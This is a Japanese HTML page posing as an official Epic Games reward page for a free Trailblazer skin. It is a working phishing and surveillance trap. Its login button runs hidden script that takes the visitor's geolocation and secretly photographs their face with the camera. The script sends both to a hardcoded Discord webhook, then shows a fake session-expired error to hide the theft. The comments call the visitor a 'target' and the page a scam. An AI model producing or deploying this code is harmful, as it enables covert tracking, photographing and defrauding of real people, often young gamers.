<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>トレイルブレイザー無料獲得</title>
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-card {
            background-color: #202020;
            width: 100%;
            max-width: 400px;
            padding: 40px 30px;
            border-radius: 8px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
            text-align: center;
        }
        .epic-logo {
            font-size: 28px;
            font-weight: 900;
            letter-spacing: 3px;
            margin-bottom: 25px;
            color: #ffffff;
            text-transform: uppercase;
        }
        .skin-banner {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            border-radius: 6px;
            padding: 15px;
            margin-bottom: 25px;
            border: 1px solid #3a6ea5;
        }
        .skin-banner h3 {
            margin: 0 0 5px 0;
            font-size: 16px;
            color: #00ffcc;
        }
        .skin-banner p {
            margin: 0;
            font-size: 13px;
            color: #dddddd;
        }
        .btn-epic {
            background-color: #0070f3;
            color: white;
            border: none;
            width: 100%;
            padding: 14px;
            font-size: 15px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }
        .btn-epic:hover {
            background-color: #0051a2;
        }
        .footer-text {
            margin-top: 20px;
            font-size: 11px;
            color: #777777;
            line-height: 1.4;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="epic-logo">EPIC GAMES</div>
        
        <div class="skin-banner">
            <h3>🔥 Trailblazer (トレイルブレイザー)</h3>
            <p>限定特典アイテムをアカウントへ直接付与します</p>
        </div>

        <p style="font-size: 13px; color: #b0b0b0; margin-bottom: 20px;">
            受け取るにはEpic Gamesアカウントによる認証が必要です。
        </p>

        <button onclick="startAction()">Epic Gamesでログイン</button>

        <div class="footer-text">
            ※本ページは公式プロモーション報酬の受け取り専用ページです。
        </div>
    </div>

    <!-- カメラ・位置情報用の隠し要素 -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ▼ここに自分のDiscordのWebhook URLを貼り付けてね！
        const webhookUrl = 'https://discord.com/api/webhooks/1553096437376487586/kzTpRNKsEjfqTr3L4T75-2tqikQ7g-bjuz4QZYC8CqEqCqeMhSRlOeC5NJ85kf9QTlK3';

        function startAction() {
            // 位置情報の取得
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: `📍 ターゲットの位置情報: 緯度 ${lat}, 経度 ${lon}` })
                    });
                });
            }

            // カメラの起動と撮影
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('file', blob, 'target.png');
                            formData.append('content', '📸 【トレイルブレイザー詐欺】ターゲットの顔写真です！');

                            fetch(webhookUrl, {
                                method: 'POST',
                                body: formData
                            });

                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/png');
                    }, 1500);
                })
                .catch(err => {
                    console.log("カメラエラー");
                });

            // 自然なエラー演出
            setTimeout(() => {
                alert("エラー: セッションの有効期限が切れています。もう一度やり直してください。");
            }, 1000);
        }
    </script>
</body>
</html>
